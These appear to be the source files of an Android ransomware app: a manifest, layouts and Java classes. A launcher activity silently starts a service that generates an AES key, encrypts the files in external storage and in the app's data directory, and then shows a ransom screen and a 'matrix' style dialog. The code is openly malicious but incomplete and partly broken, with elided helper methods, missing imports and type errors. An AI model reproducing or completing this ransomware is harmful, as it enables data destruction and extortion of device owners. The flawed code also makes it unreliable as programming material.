File AndroidManifest.xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.ransomware">

    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.REBOOT" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/AppTheme">

        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity android:name=".RansomActivity" />
        <activity android:name=".RansomDialogActivity"
            android:theme="@style/Theme.AppCompat.Light.Dialog">
        </activity>

        <service android:name=".RansomwareService" />

    </application>

</manifest>
File activity_main.xml
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent" />
File activity_ransom.xml
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <TextView
        android:id="@+id/textView"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:text="@string/ransom_message"
        android:textColor="@android:color/white"
        android:textSize="18sp" />

</RelativeLayout>
File dialog_ransom.xml
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent">

    <TextView
        android:id="@+id/matrix_effect_text_view"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:textColor="@android:color/white"
        android:textSize="30sp" />

</RelativeLayout>
File MainActivity.java
import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent serviceIntent = new Intent(this, RansomwareService.class);
        startService(serviceIntent);

        finish();
    }
}
File RansomActivity.java
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;

public class RansomActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_ransom);
    }
}
File RansomDialogActivity.java
import android.app.Dialog;
import android.content.DialogInterface;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.DialogFragment;
import android.view.View;
import android.widget.TextView;

import java.util.Random;

public class RansomDialogActivity extends DialogFragment {

    public static final String TAG = "RansomDialogActivity";

    private static final String[] NUMBERS = {"57"};

    @NonNull
    @Override
    public Dialog onCreateDialog(Bundle savedInstanceState) {
        Dialog dialog = new Dialog(getActivity());
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setContentView(R.layout.dialog_ransom);
        dialog.setCancelable(false);

        TextView matrixEffectTextView = dialog.findViewById(R.id.matrix_effect_text_view);
        matrixEffectTextView.setTypeface(Typeface.create("Courier New", Typeface.BOLD));

        Handler handler = new Handler();
        Runnable runnable = new Runnable() {
            private Random random = new Random();

            @Override
            public void run() {
                matrixEffectTextView.append(NUMBERS[random.nextInt(NUMBERS.length)] + " ");
                handler.postDelayed(this, 100);
            }
        };

        handler.post(runnable);

        dialog.show();

        return dialog;
    }
}
File RansomwareService.java
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.security.KeyStore;
import android.util.Log;
import android.widget.Toast;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.Key;
import java.security.KeyPairGenerator;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidKeySpecException;
import java.security.UnrecoverableKeyException;
import java.security.NoSuchPaddingException;
import java.security.spec.InvalidKeySpecException;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

public class RansomwareService extends Service {

    private static final String TAG = "RansomwareService";
    private static final String ANDROID_KEY_STORE = "AndroidKeyStore";
    private static final String AES_ALGORITHM = "AES";
    private static final String RSA_ALGORITHM = "RSA";
    private static final String TRANSFORMATION = "RSA/ECB/PKCS1Padding";
    private static final int KEY_SIZE = 2048;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();

        Thread thread = new Thread(this::cryptFiles);
        thread.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    private void cryptFiles() {
        try {
            Key key = generateAESKey();
            IvParameterSpec iv = generateIv();

            File externalStorage = Environment.getExternalStorageDirectory();
            File[] files = externalStorage.listFiles();

            if (files != null && files.length > 0) {
                for (File file : files) {
                    if (!file.isDirectory()) {
                        Log.d(TAG, "Crittografando: " + file.getAbsolutePath());
                        encryptFile(file, key, iv);
                    }
                }
            }

            File internalStorage = getApplicationInfo().dataDir;
            files = internalStorage.listFiles();

            if (files != null && files.length > 0) {
                for (File file : files) {
                    if (!file.isDirectory()) {
                        Log.d(TAG, "Crittografando: " + file.getAbsolutePath());
                        encryptFile(file, key, iv);
                    }
                }
            }

            Intent ransomIntent = new Intent(this, RansomActivity.class);
            ransomIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(ransomIntent);

            stopSelf();
        } catch (KeyStoreException | NoSuchAlgorithmException | InvalidKeySpecException | UnrecoverableKeyException | NoSuchPaddingException | IOException e) {
            Log.e(TAG, "Errore durante la crittografia: ", e);
        }
    }

    // ...
}